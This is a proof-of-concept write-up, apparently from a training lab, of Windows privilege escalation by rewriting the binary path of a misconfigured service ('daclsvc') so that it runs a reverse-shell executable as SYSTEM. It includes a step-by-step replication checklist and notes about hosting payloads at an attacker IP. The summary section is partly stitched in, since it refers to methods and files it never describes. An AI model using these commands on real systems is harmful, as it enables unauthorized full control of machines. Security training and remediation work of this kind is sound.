# Proof of Concept: Privilege Escalation via Insecure Service Permissions

### Vulnerability Overview

**Insecure Service Permissions** is a Windows privilege escalation vulnerability where a service's permissions allow a low-privileged user to modify its configuration (e.g., binary path) via the Service Control Manager (SCM). Since Windows services often run with `SYSTEM` privileges, an attacker can manipulate the service's configuration—such as changing the executable path—to execute a malicious binary, thereby gaining elevated access to the system.

---

### Proof of Concept (PoC)

This PoC demonstrates how a low-privileged user can exploit the "Insecure Service Permissions" vulnerability to escalate privileges on a Windows machine. The test was conducted as a white box assessment, with prior knowledge of login credentials and the affected service (`daclsvc`). The process involves gaining initial access, identifying the vulnerable service, modifying its binary path to point to a malicious executable, and starting the service to gain an elevated shell.

#### Initial Access
- Logged into the target Windows machine using credentials for the user account `user`.  
- Established a reverse shell to connect to the attacker machine for command execution.  
  - **Screenshot**: Initial Access via Reverse Shell  
    ![Initial Access](https://github.com/user-attachments/assets/6705201c-abfd-4448-ba41-52b7822884fa)

#### Step 1: Query the Service Configuration
- Queried the service `daclsvc` to verify its privilege level using the following command:  
  ```bash
  sc qc daclsvc
  ```
- **Result**: The service runs with `SYSTEM` privileges (`SERVICE_START_NAME: LocalSystem`), and its binary path is `BINARY_PATH_NAME: "C:\Program Files\DACL Service\daclservice.exe"`.  
  - **Screenshot**: Service Configuration  
    ![Service Details](https://github.com/user-attachments/assets/15578eb3-d703-4a3b-8338-0e9aa873261d)

#### Step 2: Check User Permissions on the Service
- Used `accesschk.exe` from Sysinternals to analyze the permissions of the user account `user` on the service `daclsvc`:  
  ```bash
  C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
  ```
  - **Command Breakdown**:  
    - `/accepteula`: Auto-accepts the EULA.  
    - `-u`: Checks user-level access.  
    - `-w`: Checks for write permissions.  
    - `-c`: Targets a specific service.  
    - `-q`: Quiet mode, suppresses banners.  
    - `-v`: Verbose output for detailed permissions.  
    - `user`: The user account being checked.  
    - `daclsvc`: The target service.  

- **Result**: The user account `user` has permissions including `SERVICE_CHANGE_CONFIG`, allowing modification of the service's configuration (e.g., binary path, display name, start type).  
  - **Screenshot**: Permission Results  
    ![Permission Results](https://github.com/user-attachments/assets/7f66ca50-bb75-4957-ad89-f05ad46e6320)

#### Step 3: Exploit the Vulnerability
- **Objective**: Modify the service's binary path to point to a malicious executable (`esc.exe`) with reverse shell capabilities.  
- Changed the binary path of the `daclsvc` service using the following command:  
  ```bash
  sc config daclsvc binpath= "\"C:\users\user\esc.exe\""
  ```
  - **Note**: The binary path was updated to execute `esc.exe`, a malicious file that establishes a reverse shell when the service starts.  
  - **Screenshot**: Binary Path Modification Success  
    ![Binary Path Modified](https://github.com/user-attachments/assets/a709d56f-61e2-4b89-b67a-7c39ba2b3b6a)

#### Step 4: Trigger the Malicious File and Gain Elevated Shell
- Set up a listener on the attacker machine to capture the reverse shell connection (command not shown but implied from prior setup).  
- Started the service to execute the malicious binary:  
  ```bash
  net start daclsvc
  ```
- **Result**: The service executed `esc.exe`, establishing a reverse shell with `SYSTEM` privileges on the attacker machine.  
  - **Screenshot**: Elevated Shell via Reverse Shell  
    ![Elevated Shell](https://github.com/user-attachments/assets/c58ea347-7bd3-450e-8bf6-e30a70964771)


---

### Summary of Findings

- The `daclsvc` service had insecure permissions, allowing the low-privileged user `user` to modify its configuration (`SERVICE_CHANGE_CONFIG`).  
- By changing the service's binary path to a malicious executable (`esc.exe`), the user successfully escalated privileges to `SYSTEM` level upon starting the service.  
- The exploit demonstrates the potential for attackers to gain full control of the system by leveraging misconfigured service permissions.

---










Below is a concise summary of the steps taken across all Proof of Concept (PoC) reports for the vulnerabilities ("Insecure Service Executables," "Insecure Autoruns," and "Insecure Service Permissions"). The steps are presented as a checklist that can be used to replicate the privilege escalation attacks on a Windows machine. The checklist is streamlined for clarity and focuses on the key actions required for each method.

---

## Checklist: Replicating this Attack on a Windows Machine
**Target**: Exploit weak service permissions (`daclsvc`) to modify its binary path and execute a malicious binary.

- [ ] Establish a reverse shell to the attacker machine (listener already set up).
- [ ] Query the service to confirm it runs with SYSTEM privileges:  
  `sc qc daclsvc`
- [ ] Check the user’s permissions on the service using `accesschk`:  
  `C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
- [ ] Modify the service’s binary path to point to the malicious file `esc.exe`:  
  `sc config daclsvc binpath= "\"C:\users\user\esc.exe\""`
- [ ] Start the service to execute the malicious binary and gain a reverse shell:  
  `net start daclsvc`
- [ ] (Alternative) Modify the binary path to point to `malicious.exe` (e.g., to add the user to the admin group):  
  `sc config daclsvc binpath= "C:\Users\user\malicious.exe"`  
  Then start the service: `net start daclsvc`

---

### Notes
- Ensure the malicious files (`esc.exe`, `x.exe`, `malicious.exe`) are hosted on an accessible server (e.g., `http://10.4.106.235/`).
- Verify the listener port (e.g., `2294`) matches the configuration of the malicious binary.
- The `accesschk.exe` tool must be available on the target system (e.g., at `C:\PrivEsc\accesschk.exe`).
- Admin login (for Method 2) or service restart (for Methods 1 and 3) is required to trigger the exploit.












### Conclusion

This PoC confirms that the "Insecure Service Permissions" vulnerability in the `daclsvc` service allows a low-privileged user to escalate privileges to `SYSTEM` level. By exploiting the `SERVICE_CHANGE_CONFIG` permission, an attacker can modify the service's binary path to execute arbitrary code with elevated privileges, posing a significant risk to system security. Immediate remediation is recommended, such as restricting service permissions to prevent unauthorized configuration changes and ensuring services run with the least privilege necessary.

